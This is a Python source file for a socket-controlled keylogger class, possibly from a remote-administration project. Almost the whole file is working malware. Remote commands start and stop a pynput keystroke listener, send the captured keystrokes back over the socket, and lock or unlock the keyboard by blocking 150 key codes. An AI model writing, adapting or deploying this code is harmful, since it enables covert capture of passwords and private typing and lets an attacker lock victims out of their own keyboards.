from pynput.keyboard import Listener, Key
import keyboard
import time

class KeyLogger:
    def __init__(self, sock = None):
        self.keys = ''
        self.client = sock
        self.is_hooking = False
        pass

    def run(self):
       while True:
            cmd = self.client.recv(32).decode('utf8')
            if cmd == "keystroke,hook":
                self.hook_key()
            elif cmd == "keystroke,unhook":
                self.unhook_key()
            elif cmd == "keystroke,print":
                self.print_keys()
            elif cmd == "keystroke,lock":
                self.lock_keyboard()
            elif cmd == "keystroke,unlock":
                self.unlock_keyboard()
            elif cmd == "exit":
                return     
    
    def on_press(self, key):
        print(key, type(key))
        if type(key) == Key:
            if key == Key.space:
                self.keys += ' '
            elif key == Key.enter:
                self.keys += '\n'
            elif key == Key.tab:
                self.keys += '\t'
            else:
                self.keys += '<' + str(key) + '>'
        else:
            if ord(key.char) < 32:
                self.keys += chr(ord(key.char) + 96)
            else:
                self.keys += key.char
    
    def hook_key(self): 
        if self.is_hooking: return
        self.listener = Listener(on_press = self.on_press)
        self.listener.start()
        # self.listener.join()
        self.is_hooking = True

    def unhook_key(self):
        if not self.is_hooking: return
        self.listener.stop()
        self.is_hooking = False
        return False
    
    def print_keys(self):
        # self.client.sendall(bytes(str(len(self.keys)), "utf8"))
        # time.sleep(0.1)
        # id = 0
        # while id < len(self.keys):
        #     self.client.sendall(bytes(self.keys[id : id + 4096], "utf8"))
        #     id += 4096
        self.client.sendall(bytes(self.keys, "utf8"))
        self.keys = ''
        pass
    
    def lock_keyboard(self):
        for key in range(150):
            keyboard.block_key(key)
        pass
    
    def unlock_keyboard(self):
        keyboard.unhook_all()
        pass

    pass

# app = KeyLogger()
# app.run()